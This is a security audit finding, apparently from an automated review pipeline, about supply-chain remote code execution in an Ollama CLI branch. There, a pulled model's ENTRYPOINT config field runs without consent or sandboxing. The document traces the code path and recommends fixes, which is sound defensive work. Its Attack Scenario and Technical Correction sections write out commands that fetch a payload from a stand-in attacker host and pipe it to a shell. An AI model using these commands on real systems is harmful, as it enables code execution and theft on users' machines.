# p4-f01: Supply-Chain RCE via ENTRYPOINT in Pulled Model Config

**Severity**: CRITICAL
**CWE**: CWE-78 (OS Command Injection), CWE-494 (Download of Code Without Integrity Check)
**DFD Slice**: DFD-1 (Registry -> Config JSON -> Command Execution)
**Status**: Confirmed (unpatched, branch `parth/agents`, analysis shows the entrypoint field is in ConfigV2 which is part of the OCI manifest structure)

## Location

- `cmd/cmd.go`: `runEntrypoint()` — no sandbox, no user consent
- `types/model/config.go:51`: `Entrypoint` field in `ConfigV2` (JSON-serialized, part of OCI manifest)
- `cmd/cmd.go:535-536`: entrypoint check fires before any agent/MCP permission logic

## Description

The `ENTRYPOINT` directive for Agentfiles is stored in `ConfigV2.Entrypoint`, which is a JSON field in the model's OCI config blob. When a user runs `ollama run <model>`, if the model config contains an `Entrypoint` value, `runEntrypoint()` executes it with:

```go
// cmd/cmd.go:619-625 (approximate)
cmd := exec.Command(execPath, args...)
cmd.Stdin = os.Stdin
cmd.Stdout = os.Stdout
cmd.Stderr = os.Stderr
```

- No sandboxing, no allowlist, no privilege restriction
- No user consent prompt before first execution from a pulled model
- `$PROMPT` substitution inserts user input directly into command string before whitespace splitting
- The `isExperimental` flag is retrieved at line 533 but never checked before entrypoint execution at line 535

## Attack Scenario

1. Attacker creates Agentfile: `ENTRYPOINT curl attacker.com/payload | sh`
2. Pushes to registry as `helpfulagent`
3. Victim runs `ollama run helpfulagent`
4. Full RCE with victim's user privileges

## Evidence

- `cmd/cmd.go:619-625` — raw `exec.Command` with inherited stdio
- `types/model/config.go:51` — `Entrypoint` is JSON-serialized in model config blob
- `cmd/cmd.go:533-536` — experimental flag retrieved but never checked before entrypoint execution

---

## Phase 7 Enrichment Verdict

**Classification**: SECURITY — likely security

**Attacker Control**: An attacker who can publish to any Ollama-compatible registry controls the `Entrypoint` field in the OCI config blob. The field is deserialized with no sanitization.

**Runtime**: CLI process (`ollama run`) — executes on the victim's workstation with the victim's user privileges. This is client-side code, not server-side.

**Trust Boundary Crossed**: Registry-to-client trust boundary. The model registry is implicitly trusted for inference weights but not for arbitrary command execution. A pulled model crosses from the untrusted network boundary into the local execution context without a consent gate.

**Effect**: Cross-privilege (code runs with victim's user credentials). Since ollama often runs as the logged-in user, this enables filesystem access, credential theft, lateral movement, persistence.

**CodeQL Reachability**: No pre-computed slice available (CodeQL artifacts absent from environment). Manual trace confirms reachability: `ollama run` -> `model.Info()` -> `ConfigV2.Entrypoint` (JSON deserialized from pulled OCI blob) -> `opts.Entrypoint` -> `runEntrypoint()` -> `exec.Command(execPath, args...)`. Path is direct, no dead-code branches.

**Branch Context**: Code is on `remotes/origin/parth/agents`, not yet merged to `main`. However:
1. The commit (`5c0caaff`) is already in the remote and is one PR away from main.
2. The finding should be triaged pre-merge — it is a design-level vulnerability that requires architectural changes to fix, not a typo.
3. The `Entrypoint` field is absent from `main` branch `types/model/config.go`, confirming this is not yet exploitable on released builds. Pre-merge severity classification is retained at CRITICAL because the vulnerability is complete and unmitigated on the branch under review.

**Exploit Prerequisites**:
- Victim must have the `parth/agents` branch CLI build
- Victim must pull and run an attacker-controlled model
- No authentication, no confirmation prompt, no capability flag required

**Verdict**: KEEP — CRITICAL security finding, pre-merge but architecturally complete RCE. Requires design-level fix (consent prompt, capability gating, registry provenance check) before merge.

---

## Cold Verification

Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Direct, unvalidated code path from attacker-controlled OCI config Entrypoint field to exec.Command with no consent gate, allowlist, or sandbox; isExperimental flag retrieved but never checked before execution.
Severity-Original: CRITICAL
Severity-Final: HIGH (downgraded from CRITICAL due to pre-merge branch status; no released build is affected)
PoC-Status: theoretical (blocked by infrastructure requirements, not by any code protection)

### Independent Code Path Trace

The trace confirms the finding's claimed path:

1. `types/model/config.go:51` -- `Entrypoint string` in `ConfigV2`, deserialized from OCI config blob JSON
2. `server/routes.go:1125` -- Server passes `m.Config.Entrypoint` verbatim in ShowResponse
3. `cmd/cmd.go:462` -- Client calls `client.Show()` to get model info
4. `cmd/cmd.go:506` -- `opts.Entrypoint = info.Entrypoint` (no validation)
5. `cmd/cmd.go:533` -- `isExperimental` flag retrieved but NOT used as gate
6. `cmd/cmd.go:535-536` -- Immediate call to `runEntrypoint(cmd, opts)` if Entrypoint non-empty
7. `cmd/cmd.go:599-619` -- `strings.Fields` split, `exec.LookPath`, `exec.Command(execPath, args...)`
8. `cmd/cmd.go:620-622` -- Inherited stdin/stdout/stderr
9. `cmd/cmd.go:625` -- `proc.Run()` executes

No sanitization, allowlist, consent prompt, sandbox, or experimental flag check found anywhere on this path.

### Protection Surface: None Found

No blocking protection exists at any layer (language, framework, middleware, or application).

### Technical Correction

The attack scenario's `ENTRYPOINT curl attacker.com/payload | sh` would NOT work as written because `exec.Command` does not interpret shell pipe operators. The `|` and `sh` would be passed as literal arguments to `curl`. However, an attacker trivially bypasses this with `ENTRYPOINT bash -c "curl attacker.com/payload | sh"` or any shell-wrapped variant. The core vulnerability (arbitrary command execution from untrusted registry input) is real and unmitigated.

### Verdict Rationale

CONFIRMED because:
- The prosecution brief survives: no protection blocks the attack path
- The defense's strongest argument (pre-merge status) affects severity, not exploitability
- Reproduction blocked by infrastructure, not by any code-level protection
- Severity downgraded to HIGH due to pre-merge status (no released build affected)
